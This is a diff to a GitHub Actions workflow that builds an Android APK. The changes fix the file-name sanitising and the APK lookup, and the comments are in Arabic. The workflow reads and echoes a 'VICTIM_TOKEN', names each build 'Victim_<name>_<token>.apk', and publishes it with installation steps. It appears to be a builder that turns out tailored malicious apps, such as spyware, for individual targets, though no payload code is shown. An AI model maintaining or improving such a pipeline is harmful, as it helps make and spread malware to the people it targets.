@@ -74,7 +74,7 @@ jobs:
           java-version: '17'
 
       # ============================================
-      # 5. Set up Gradle (★ الأهم ★)
+      # 5. Setup Gradle
       # ============================================
       - name: Setup Gradle
         uses: gradle/gradle-build-action@v3
@@ -82,15 +82,17 @@ jobs:
           gradle-version: 8.2
 
       # ============================================
-      # 6. ★★★ Generate Gradle Wrapper ★★★
+      # 6. Generate Gradle Wrapper
       # ============================================
       - name: Generate Gradle Wrapper
         run: |
           echo "== Generating Gradle Wrapper =="
-          gradle wrapper --gradle-version 8.2 --distribution-type bin
+          if [ ! -f gradlew ]; then
+            gradle wrapper --gradle-version 8.2 --distribution-type bin
+          fi
           chmod +x gradlew
           ls -la gradlew gradle/wrapper/ || true
-          echo "== Wrapper generated =="
+          echo "== Wrapper ready =="
 
       # ============================================
       # 7. Setup Android SDK
@@ -147,7 +149,7 @@ jobs:
         run: |
           echo "== Starting Build =="
           echo "VICTIM_TOKEN=${VICTIM_TOKEN:0:12}..."
-          ./gradlew assembleDebug --no-daemon --stacktrace --info
+          ./gradlew assembleDebug --no-daemon --stacktrace
           echo "== Build Complete =="
 
       # ============================================
@@ -160,18 +162,64 @@ jobs:
           find . -name "*.apk" -type f || echo "No APKs found"
 
       # ============================================
-      # 13. Rename APK
+      # 13. ★★★ Rename APK — الإصلاح هنا ★★★
       # ============================================
       - name: Rename APK
         run: |
+          set -e
+          
           mkdir -p output
+          
           SHORT="${{ steps.preoutputs.outputs.short }}"
           NAME="${{ steps.preoutputs.outputs.name }}"
-          SAFE_NAME=$(echo "$NAME" | tr -cd '[:alnum:]_- ')
-          if [ -z "$SAFE_NAME" ]; then SAFE_NAME="victim"; fi
+          
+          echo "== Original Name: [$NAME] =="
+          echo "== Token Short: [$SHORT] =="
+          
+          # ★ تنظيف الاسم — الشرطة في النهاية عشان tr ما تفسرهاش كنطاق
+          SAFE_NAME=$(echo "$NAME" | tr -cd '[:alnum:]_ -' | tr -s ' ')
+          
+          # ★ لو فاضي، استخدم default
+          if [ -z "$SAFE_NAME" ] || [ "$SAFE_NAME" = " " ]; then
+            SAFE_NAME="victim"
+          fi
+          
+          # ★ شيل المسافات من البداية والنهاية
+          SAFE_NAME=$(echo "$SAFE_NAME" | sed 's/^ *//;s/ *$//')
+          
+          # ★ لو لسه فاضي بعد التنظيف
+          if [ -z "$SAFE_NAME" ]; then
+            SAFE_NAME="victim"
+          fi
+          
+          # ★ استبدل المسافات بـ _ لتجنب مشاكل في أسماء الملفات
+          SAFE_NAME=$(echo "$SAFE_NAME" | tr ' ' '_')
+          
           APK_NAME="Victim_${SAFE_NAME}_${SHORT}.apk"
-          cp app/build/outputs/apk/debug/app-debug.apk "output/$APK_NAME"
-          echo "== APK renamed to: $APK_NAME =="
+          
+          echo "== Safe Name: [$SAFE_NAME] =="
+          echo "== Final APK Name: [$APK_NAME] =="
+          
+          # ★ ابحث عن APK في أكثر من مكان محتمل
+          APK_SOURCE=""
+          if [ -f "app/build/outputs/apk/debug/app-debug.apk" ]; then
+            APK_SOURCE="app/build/outputs/apk/debug/app-debug.apk"
+          elif [ -f "app/build/outputs/apk/debug/app-debug-unaligned.apk" ]; then
+            APK_SOURCE="app/build/outputs/apk/debug/app-debug-unaligned.apk"
+          else
+            APK_SOURCE=$(find app/build/outputs -name "*.apk" -type f | head -n 1)
+          fi
+          
+          if [ -z "$APK_SOURCE" ] || [ ! -f "$APK_SOURCE" ]; then
+            echo "❌ ERROR: APK not found!"
+            find . -name "*.apk" -type f
+            exit 1
+          fi
+          
+          echo "== APK Source: $APK_SOURCE =="
+          cp "$APK_SOURCE" "output/$APK_NAME"
+          
+          echo "== APK copied to: output/$APK_NAME =="
           ls -la output/
 
       # ============================================
@@ -200,7 +248,6 @@ jobs:
             - **Version Code:** ${{ steps.version.outputs.new_code }}
             - **Token:** `${{ steps.preoutputs.outputs.short }}...`
             - **Build:** #${{ github.run_number }}
-            - **Date:** ${{ github.event.head_commit.timestamp }}
             
             ### Installation
             1. Download the APK below
